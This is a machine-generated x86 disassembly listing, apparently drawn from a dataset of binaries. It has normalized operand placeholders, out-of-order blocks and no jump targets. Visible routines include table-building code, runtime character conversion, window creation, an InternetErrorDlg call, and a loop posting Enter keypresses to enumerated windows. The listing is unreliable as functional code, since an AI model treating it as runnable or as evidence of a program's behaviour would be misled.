cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] 0x1
test eax eax
je r-xdata
jmp r-xdata
or [ edi + 0x1c ] 0xffffffff
xor eax eax
cmp [ edi + 0x44 ] eax
jle r-xdata
cmp [ ebp - 0x4 ] 0x2
jl r-xdata
sub ebx [ ebp - 0x8 ]
push ecx
mov [ ebp - 0x1c ] ebx
fild [ ebp - 0x1c ]
push ecx
fidiv [ ebp - 0xc ]
fstp [ esp ]
push eax
push ebx
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0x18
mov [ ebp - 0xc ] eax
push [ ebp - 0x4 ]
mov eax esi
push [ ebp - 0x10 ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
pop ecx
pop ecx
sub_1001a94d
push ebp
mov ebp esp
mov eax 0x1440
call sub_10027570
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jle r-xdata
xor eax eax
xor edx edx
inc eax
cmp edi eax
mov ebx edi
mov [ ebp - 0x420 ] edx
mov [ ebp - 0xc30 ] edx
mov [ ebp - 0x1440 ] 0xfffffffe
mov [ ebp - 0x4 ] eax
jl r-xdata
lea edx [ ebp - 0xc2c ]
sub edx ecx
mov esi edi
cmp ebx 0x204
jge r-xdata
mov ecx edi
or eax 0xffffffff
lea edi [ ebp - 0x143c ]
[ edi ]
shl eax 0x8
mov [ edx + ecx ] eax
add ecx 0x4
dec esi
jne r-xdata
inc eax
push 0x7d2
jmp r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
inc edx
xor bl bl
cmp edi edx
jl r-xdata
mov ecx [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] esi
mov esi [ ecx ]
mov ecx edx
mov eax [ ecx ]
test eax eax
jne r-xdata
call sub_100143a7
pop edi
pop esi
pop ebx
leave
retn
lea esi [ ebp - 0x143c ]
mov ecx [ ebp - 0x4 ]
inc edx
lea eax [ ebp + edx * 4 - 0x420 ]
mov [ eax ] ecx
mov eax ecx
mov ecx edx
sar ecx 0x1
mov edi [ ebp + ecx * 4 - 0x420 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp + eax * 4 - 0xc30 ]
mov esi [ ecx ]
cmp esi [ ebp + edi * 4 - 0xc30 ]
mov [ ebp - 0xc ] edx
jge r-xdata
cmp edx 0x104
jl r-xdata
mov [ ebp + ecx * 4 - 0x420 ] edi
mov ecx [ ebp - 0x8 ]
mov edi ecx
sar edi 0x1
mov [ ebp - 0x8 ] edi
mov edi [ ebp + edi * 4 - 0x420 ]
cmp esi [ ebp + edi * 4 - 0xc30 ]
jl r-xdata
jmp r-xdata
cmp ecx 0x11
mov eax [ ebp + 0x8 ]
mov [ eax + edx - 0x1 ] cl
jle r-xdata
mov eax esi
cmp edx 0x1
jg r-xdata
push 0x7d1
inc [ ebp - 0x4 ]
mov [ ebp + ecx * 4 - 0x420 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0xc ]
jle r-xdata
inc edx
add esi 0x4
cmp edx edi
jle r-xdata
mov bl 0x1
mov eax [ eax ]
lea eax [ ebp + eax * 4 - 0x1440 ]
inc ecx
cmp [ eax ] 0x0
jge r-xdata
mov eax [ ebp - 0x41c ]
mov ecx [ ebp + edx * 4 - 0x420 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push 0x2
dec edx
pop esi
inc eax
cmp esi edx
mov [ ebp - 0x41c ] ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
xor ecx ecx
cmp [ esi ] ecx
jl r-xdata
test bl bl
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp + eax * 4 - 0x420 ] ecx
mov esi [ ebp + edx * 4 - 0x420 ]
mov ecx [ ebp - 0x41c ]
xor eax eax
dec edx
inc eax
cmp edx 0x2
mov [ ebp - 0x41c ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x2
jl r-xdata
mov ecx [ ebp + ecx * 4 - 0xc30 ]
mov [ ebp - 0xc ] ecx
xor esi esi
inc esi
mov esi [ ebp - 0x8 ]
mov [ ebp + eax * 4 - 0x420 ] esi
mov esi [ ebp - 0x10 ]
mov eax ecx
shl eax 0x2
mov ecx [ ebp + eax - 0xc30 ]
shl esi 0x2
inc ebx
mov [ ebp + eax - 0x1440 ] ebx
mov eax [ ebp + esi - 0xc30 ]
mov edi 0xff
mov [ ebp + esi - 0x1440 ] ebx
mov [ ebp - 0x4 ] ecx
and [ ebp - 0x4 ] edi
mov esi eax
and esi edi
mov edi [ ebp - 0x4 ]
cmp esi edi
jle r-xdata
mov esi [ ebp + esi * 4 - 0xc30 ]
cmp [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] esi
mov ecx [ ebp + esi * 4 - 0x420 ]
mov edi [ ebp - 0xc ]
cmp edi [ ebp + ecx * 4 - 0xc30 ]
jl r-xdata
mov ecx [ ebp + esi * 4 - 0x41c ]
mov edi [ ebp + esi * 4 - 0x420 ]
mov ecx [ ebp + ecx * 4 - 0xc30 ]
cmp ecx [ ebp + edi * 4 - 0xc30 ]
jge r-xdata
lea ecx [ ebp + esi * 4 - 0xc30 ]
mov eax [ ecx ]
sar eax 0x8
cdq
sub eax edx
sar eax 0x1
inc eax
shl eax 0x8
inc esi
cmp esi edi
mov [ ecx ] eax
jle r-xdata
jmp r-xdata
or [ ebp + ebx * 4 - 0x1440 ] 0xffffffff
mov esi 0xffffff00
and eax esi
and ecx esi
add eax ecx
inc edi
or eax edi
inc edx
mov [ ebp + ebx * 4 - 0xc30 ] eax
lea eax [ ebp + edx * 4 - 0x420 ]
mov ecx edx
sar ecx 0x1
mov [ eax ] ebx
mov esi [ ebp + ecx * 4 - 0x420 ]
mov eax ebx
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp + eax * 4 - 0xc30 ]
mov edi [ ecx ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
mov [ ebp - 0x4 ] edx
jge r-xdata
mov edi esi
mov esi [ ebp - 0x4 ]
mov esi [ ebp + esi * 4 - 0x420 ]
mov edi [ ebp - 0xc ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
jl r-xdata
mov esi [ ebp - 0x4 ]
shl esi 0x2
mov edi [ ebp + esi - 0x41c ]
mov esi [ ebp + esi - 0x420 ]
mov edi [ ebp + edi * 4 - 0xc30 ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
jge r-xdata
mov [ ebp + eax * 4 - 0x420 ] ecx
mov eax esi
add esi esi
cmp esi edx
jle r-xdata
inc esi
mov ecx [ ebp - 0x4 ]
mov [ ebp + ecx * 4 - 0x420 ] eax
mov ecx [ ecx ]
mov edi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp + eax * 4 - 0x420 ] esi
mov eax [ ebp - 0x4 ]
shl [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x4 ] edx
jle r-xdata
inc [ ebp - 0x4 ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
sar edi 0x1
mov [ ebp + ecx * 4 - 0x420 ] esi
mov esi [ ebp + edi * 4 - 0x420 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + esi * 4 - 0xc30 ]
jl r-xdata
jge r-xdata
sub_1001ac90
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
xor ecx ecx
cmp esi [ ebp + 0x14 ]
push edi
mov ebx eax
mov [ ebp - 0x4 ] esi
jg r-xdata
push 0x17
xor eax eax
pop ecx
mov edi edx
[ edi ]
xor ecx ecx
cmp [ ebp + 0x18 ] ecx
jle r-xdata
xor eax eax
cmp [ ebp + 0x18 ] eax
jle r-xdata
xor ecx ecx
inc ecx
movzx eax [ ecx + ebx ]
lea eax [ edx + eax * 4 + 0x4 ]
inc [ eax ]
inc ecx
cmp ecx [ ebp + 0x18 ]
jl r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] eax
jle r-xdata
movzx edi [ eax + ebx ]
cmp edi [ ebp - 0x4 ]
jne r-xdata
mov edi [ edx + ecx * 4 - 0x4 ]
lea eax [ edx + ecx * 4 ]
add [ eax ] edi
inc ecx
cmp ecx 0x17
jl r-xdata
mov edi [ ebp + 0x8 ]
push 0x17
xor eax eax
and [ ebp + 0x18 ] eax
pop ecx
[ edi ]
mov ecx [ ebp + 0x14 ]
cmp esi ecx
jg r-xdata
inc eax
cmp eax [ ebp + 0x18 ]
jl r-xdata
mov edi [ ebp + 0xc ]
mov [ edi + ecx * 4 ] eax
inc ecx
lea eax [ esi + 0x1 ]
cmp eax [ ebp + 0x14 ]
jg r-xdata
mov edi [ ebp + 0x8 ]
sub edi edx
sub ecx esi
lea eax [ edx + esi * 4 ]
mov [ ebp - 0x4 ] edi
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x8 ]
lea ecx [ ecx + eax * 4 - 0x4 ]
mov ebx [ ebp - 0x4 ]
lea esi [ eax + 0x4 ]
mov edi [ esi ]
sub edi [ eax ]
add [ ebp + 0x18 ] edi
mov edi [ ebp + 0x18 ]
shl [ ebp + 0x18 ] 0x1
dec edi
dec ecx
mov [ ebx + eax ] edi
mov eax esi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov esi [ ecx ]
lea esi [ esi + esi + 0x2 ]
sub esi [ edx + eax * 4 ]
add ecx 0x4
mov [ edx + eax * 4 ] esi
inc eax
cmp eax [ ebp + 0x14 ]
jle r-xdata
sub_1001ad6a
push 0x20
mov eax sub_1004a165
call sub_10023e33
mov esi [ ebp + 0x8 ]
xor edi edi
push edi
push edi
call sub_100132cc
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push r--data
push r--data
mov [ ebp - 0x4 ] edi
push edi
mov [ esi ] r--data
call [ CreateWindowExW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_10001d1f
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001147a
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
mov [ esi + 0x18 ] ebx
mov eax esi
call sub_10023f0b
retn 0x4
sub_1001ae25
push 0x874
mov eax sub_1004a653
call sub_10023e9c
xor esi esi
mov [ ebp - 0x4 ] esi
push edi
mov [ ebp - 0x820 ] ebx
mov [ ebp - 0x81c ] esi
call sub_100141d4
cmp eax 0x197
je r-xdata
lea eax [ ebp - 0x83c ]
push eax
call sub_1001ad6a
push esi
push 0x7
mov [ ebp - 0x4 ] 0x2
mov eax [ edi + 0x4 ]
push 0x2eee
push eax
push [ ebp - 0x824 ]
call [ InternetErrorDlg@IAT ]
cmp eax esi
jne r-xdata
push r--data
lea ecx [ ebp - 0x858 ]
call sub_10001d1f
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x83c ]
push eax
call sub_100115d1
mov ecx ebx
call sub_10001b23
lea ecx [ ebx + 0x1c ]
call sub_10001b23
mov esi 0x800
push esi
lea eax [ ebp - 0x810 ]
push 0x0
push eax
mov [ ebp - 0x81c ] 0x1
mov [ ebp - 0x814 ] esi
call sub_100209e0
add esp 0xc
lea eax [ ebp - 0x814 ]
push eax
lea eax [ ebp - 0x810 ]
push eax
push 0x2b
push edi
call sub_100142ed
lea eax [ ebp - 0x810 ]
push eax
mov ecx ebx
call sub_10001444
push esi
lea eax [ ebp - 0x810 ]
push 0x0
push eax
mov [ ebp - 0x818 ] esi
call sub_100209e0
add esp 0xc
lea eax [ ebp - 0x818 ]
push eax
lea eax [ ebp - 0x810 ]
push eax
push 0x2c
push edi
call sub_100142ed
lea eax [ ebp - 0x810 ]
push eax
lea ecx [ ebx + 0x1c ]
call sub_10001444
lea ecx [ ebp - 0x83c ]
call sub_1001ae00
mov eax ebx
call sub_10023f1f
retn
push r--data
lea ecx [ ebp - 0x858 ]
call sub_10001d1f
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea eax [ ebp - 0x858 ]
push eax
lea ecx [ ebp - 0x880 ]
call sub_10001d6b
push r--data
lea eax [ ebp - 0x880 ]
push eax
call sub_10023a01
sub_1001af87
push ebx
push ebp
push esi
mov esi [ EnumWindows@IAT ]
push edi
lea ebx [ ecx + 0x18 ]
push ebx
mov edi sub_1001afc4
push edi
call esi
mov ebp [ Sleep@IAT ]
jmp r-xdata
cmp eax 0x1
je r-xdata
push 0x1
call ebp
push ebx
push edi
call esi
push 0x1
call ebp
push ebx
push edi
call esi
cmp eax 0x1
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_1001afc4
mov eax [ esp + 0x8 ]
push esi
push [ esp + 0x8 ]
mov esi [ eax ]
call [ GetParent@IAT ]
cmp eax esi
pop esi
je r-xdata
push 0x1c0001
push 0xd
push 0x100
push [ esp + 0x10 ]
call [ PostMessageW@IAT ]
dec eax
neg eax
sbb eax eax
neg eax
xor eax eax
inc eax
jmp r-xdata
retn 0x8
sub_1001afff
push 0x44
mov eax sub_10048fcb
call sub_10023e33
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001c74
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10023a01
int3
sub_1001b037
push 0x44
mov eax sub_10048fcb
call sub_10023e33
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_1000a5bc
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10023a01
int3
sub_1001b074
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_10020186
push eax
mov [ esi ] eax
call sub_1001c307
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_1001b0b7
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x20 ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_1001b0de
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x0
mov ecx esi
call sub_1001b0b7
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
and [ esi + 0x1c ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_1002004f
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x20 ] 0x0
pop edi
pop esi
pop ebp
retn
mov edi [ eax ]
push eax
call sub_1002004f
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_1001b129
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
jbe r-xdata
push esi
call sub_1001b0de
pop ecx
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
dec [ eax + rw-data ]
mov eax [ esi + 0x4 ]
cmp [ eax + rw-data ] 0x0
jg r-xdata
pop esi
pop ebp
retn
push 0x1
call sub_10007268
sub_1001b165
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_1001c307
add esi 0x18
cmp esi rw-data
pop ecx
jl r-xdata
pop esi
sub_1001b196
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jge r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_1001c317
add esi 0x18
cmp esi rw-data
pop ecx
jl r-xdata
pop esi
sub_1001b1bf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4
push esi
mov esi ecx
mov [ esi ] eax
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_1001c327
pop ecx
sub_1001b1fe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp + 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
call sub_10024d47
movsx ecx [ ebp + 0xc ]
add esp 0x1c
neg eax
sbb eax eax
and eax ecx
pop ebp
retn
sub_1001b22d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
push [ eax + 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
sar eax 0x1
push eax
push [ ebp + 0x8 ]
push 0x1
push 0x0
call sub_10024d47
mov eax [ ebp + 0xc ]
add esp 0x1c
pop ebp
retn
sub_1001b289
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1001b274
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1001b2aa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_10007b06
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1001b2cb
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1001b1bf
push rw-data
call sub_1001b2aa
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_1001b1e7
leave
retn
sub_1001b2fd
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_1001b2cb
mov [ rw-data ] 0x1
call sub_1001c347
pop ecx
sub_1001b327
push 0x4
mov eax sub_100470e8
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_1001b1bf
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
ja r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_100207fd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_1001b1e7
call sub_10023f0b
retn
mov ecx [ eax ]
call sub_10007b06
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1001b387
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1001b1bf
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx eax
mov eax [ eax ]
push 0x1
mov [ rw-data ] eax
call sub_1001b289
lea ecx [ ebp - 0x4 ]
call sub_1001b1e7
leave
retn
sub_1001b3bc
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x8
call sub_10020186
pop ecx
test eax eax
je r-xdata
push sub_1001b387
call sub_1001b25a
pop ecx
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_1001b3fa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x50 ] 0x0
jbe r-xdata
pop ebp
retn
cmp [ eax + 0x54 ] 0x10
jb r-xdata
add eax 0x40
mov eax [ eax + 0x40 ]
jmp r-xdata
push eax
push 0x0
call sub_10025eb3
pop ecx
pop ecx
sub_1001b422
push 0x4
mov eax sub_100488b7
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov al [ ebp + 0x8 ]
push r--data
lea ecx [ esi + 0x18 ]
mov [ esi ] r--data
mov [ esi + 0x14 ] al
call sub_10001d1f
mov eax esi
call sub_10023f0b
retn 0x4
sub_1001b46b
push 0x4
mov eax sub_10047116
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_1001b327
pop ecx
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_100023ce
mov [ esi ] r--data
call sub_10023f0b
retn
sub_1001b4a8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1001b46b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1001b4c9
push 0x8
mov eax sub_10047143
call sub_10023e33
mov eax [ rw-data ]
mov esi eax
test eax eax
jne r-xdata
mov eax esi
call sub_10023f0b
retn
push eax
lea ecx [ ebp - 0x10 ]
call sub_1001b1bf
mov eax [ rw-data ]
and [ ebp - 0x4 ] esi
mov esi eax
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_1001b1e7
push 0x34
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
xor esi esi
push esi
call sub_1001b422
mov esi eax
jmp r-xdata
push esi
mov [ ebp - 0x4 ] 0x0
call sub_1001b2fd
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_10002521
mov ecx esi
mov [ rw-data ] esi
call sub_10007ac8
mov eax [ rw-data ]
mov [ rw-data ] eax
sub_1001b563
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_10025eb3
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x3c ]
call sub_10002521
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_10025eb3
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x58 ]
call sub_10002521
pop esi
pop ebp
retn
sub_1001b5b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
push esi
push edi
jb r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
push eax
lea ecx [ edi + 0x3c ]
call sub_10002521
test esi esi
je r-xdata
mov eax r--data
push 0x0
push 0x0
call sub_10025eb3
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax r--data
push esi
push 0x0
call sub_10025eb3
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ edi + 0x58 ]
call sub_10002521
pop edi
pop esi
pop ebp
retn
sub_1001b60c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_100264e1
mov esi [ eax + 0x8 ]
call sub_10026495
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_1001b858
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_10026479
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_10026065
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_1001b6a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_100264e1
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_10026495
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_10026911
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_10023430
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_100268cc
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_1001b7b6
mov edi edi
push ebp
mov ebp esp
push esi
call sub_100264e1
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_10026495
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_10026cea
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_10026911
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_10026911
push eax
push [ esi + 0x8 ]
call sub_10026940
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_1001b816
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_10026fd5
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_10025dbe
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_10020040
leave
retn
sub_1001b858
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_10026ca5
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_1001b816
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_1002525b
push esi
call sub_100207fd
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_100207fd
pop ecx
mov [ esi + 0x4 ] ebx
sub_1001b8f5
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_1002525b
push esi
call sub_100207fd
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_1001b946
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_100264e1
mov esi [ eax + 0x8 ]
